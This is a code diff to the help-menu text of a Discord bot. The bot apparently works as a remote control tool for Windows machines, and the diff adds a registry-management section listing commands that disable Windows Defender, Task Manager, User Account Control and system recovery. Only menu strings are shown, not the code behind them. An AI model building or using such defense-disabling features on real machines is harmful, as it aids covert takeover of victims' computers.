@@ -39,13 +39,22 @@ async def helpcommand(ctx):
             ".taskbar >> hide/show the taskbar\n"
             ".startupapps >> list all startup apps\n"
             ".kp <process> >> kill a process\n"
-            ".defender >> toggle windows defender. usage is .defender on/off\n"
-            ".reagentc >> toggle recovery options. usage is .reagentc on/off\n"
             ".sites >> sites manager. usage is .sites block/unblock site.com\n"
-            ".user >> manage user accounts"
             "```"
         ),
         inline=False
+    )
+    embed.add_field(
+        name="REGISTRY-MANAGEMENT",
+        value=(
+            "```"
+            ".tm enable/disable >> enable/disable task manager\n"
+            ".defender >> toggle windows defender\n"
+            ".uac enable/disable >> enable/disable user account control\n"
+            ".reagentc on/off >> enable/disable reagentc\n"
+            ".user >> manage user accounts"
+            "```"
+        )
     )
 
     embed.add_field(
